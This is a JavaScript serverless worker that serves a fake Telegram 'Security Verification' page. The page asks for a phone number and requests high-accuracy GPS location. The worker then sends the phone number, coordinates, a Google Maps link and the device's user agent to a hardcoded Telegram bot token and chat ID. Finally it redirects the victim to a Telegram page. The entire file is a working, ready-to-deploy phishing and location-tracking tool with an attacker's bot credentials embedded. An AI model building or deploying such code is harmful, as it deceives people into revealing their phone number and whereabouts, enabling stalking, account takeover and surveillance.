export default {
  async fetch(request, env) {
    if (request.method === "GET") {
      return new Response(`
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Telegram Messenger</title>
          <style>
            body { font-family: -apple-system, sans-serif; background: #fff; display: flex; justify-content: center; padding-top: 50px; }
            .container { text-align: center; max-width: 350px; width: 90%; }
            .logo { width: 100px; margin-bottom: 20px; }
            h2 { font-weight: 500; margin-bottom: 10px; }
            p { color: #707579; font-size: 14px; margin-bottom: 30px; }
            input { width: 100%; padding: 14px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
            button { width: 100%; padding: 14px; background: #3390ec; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
          </style>
        </head>
        <body>
          <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
            <h2>Security Verification</h2>
            <p>To protect your account, Telegram needs to verify your current location. Please allow access to continue.</p>
            <input id="phone" type="tel" placeholder="+964 7XX XXX XXXX">
            <button id="btn" onclick="checkAndSend()">NEXT</button>
          </div>

          <script>
            function checkAndSend() {
              const phone = document.querySelector("#phone").value;
              if (!phone) { alert("يرجى إدخال رقم الهاتف"); return; }

              document.getElementById("btn").innerText = "Verifying...";

              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                  (pos) => {
                    // التحقق من الدقة (إذا كان الخطأ أقل من 100 متر نعتبره دقيق)
                    const isExact = pos.coords.accuracy < 100 ? "Exact (GPS)" : "Approximate (Network)";
                    sendToServer(phone, pos.coords.latitude, pos.coords.longitude, isExact);
                  },
                  (err) => {
                    alert("⚠️ يجب السماح بالوصول للموقع بدقة عالية للمتابعة.");
                    document.getElementById("btn").innerText = "NEXT";
                  },
                  { enableHighAccuracy: true, timeout: 10000 }
                );
              }
            }

            async function sendToServer(phone, lat, lon, type) {
              await fetch(window.location.href, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                  phone, 
                  lat, 
                  lon, 
                  locationType: type,
                  model: navigator.userAgent
                })
              });
              window.location.href = "https://telegram.org/blog/504-error";
            }
          </script>
        </body>
        </html>
      `, { headers: { "Content-Type": "text/html" } });
    }

    if (request.method === "POST") {
      try {
        const data = await request.json();
        const BOT_TOKEN = "6939721323:AAG9eDCNgz3Kct9APMRfrZUCDDSJfKbu8tc";
        const CHAT_ID = "5794792675";

        // تحديد أيقونة الحالة بناءً على نوع الموقع
        const statusEmoji = data.locationType.includes("Exact") ? "🟢 [موقع دقيق - GPS]" : "🟡 [موقع تقريبي]";
        const googleMapsLink = "https://www.google.com/maps?q=" + data.lat + "," + data.lon;

        const message = "🎯 " + statusEmoji + " 🎯\\n" +
                        "--------------------------------\\n" +
                        "📱 الرقم: " + data.phone + "\\n" +
                        "📍 الإحداثيات: " + data.lat + "," + data.lon + "\\n" +
                        "🛰 النوع: " + data.locationType + "\\n" +
                        "🗺 الخريطة: " + googleMapsLink + "\\n" +
                        "🛠 الجهاز: " + data.model;

        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });

        return new Response("ok");
      } catch (e) {
        return new Response("error", { status: 400 });
      }
    }
  }
};
